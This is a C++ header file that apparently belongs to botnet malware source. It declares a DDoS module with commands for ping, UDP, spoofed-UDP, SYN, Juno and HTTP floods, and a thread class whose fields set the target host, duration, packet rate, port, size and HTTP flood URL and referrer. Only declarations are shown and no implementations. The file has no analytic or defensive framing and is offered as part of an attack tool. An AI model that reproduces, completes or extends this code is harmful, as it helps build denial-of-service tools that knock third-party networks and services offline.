
#ifndef __DDOS_H__
#define __DDOS_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

class CDDOS : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdPing, m_cmdUDP, m_cmdSpoofedUDP, m_cmdSyn, m_cmdJuno,
				 m_cmdHTTP, m_cmdStop;
	int			 m_iNumThreads;
	bool		 m_bDDOSing;
};

class CDDOSBase : public CThread
{
public:
	CDDOSBase() { }
	virtual ~CDDOSBase() { }
	virtual void *Run();

	virtual void StartDDOS()=0;

	CString		 m_sDDOSName;
	CString		 m_sReplyTo;

	CString		 m_sHost;		// The Host to DDOS
	int			 m_iTime;		// Number of seconds DDOS is running
	int			 m_iDelay;		// Packet Delay
	int			 m_iPort;		// Port number / 0 for random
	int			 m_iNumber;		// Number of Packets
	int			 m_iSize;		// Size of Packets
	CString		 m_sURL;		// URL for HTTP flood
	CString		 m_sReferrer;	// URL for HTTP flood referrer
	bool		 m_bRecursive;	// Recursive option for HTTP flood

	bool		 m_bSilent;
	bool		 m_bNotice;

	CDDOS		*m_pDDOS;
};

#endif // __DDOS_H__
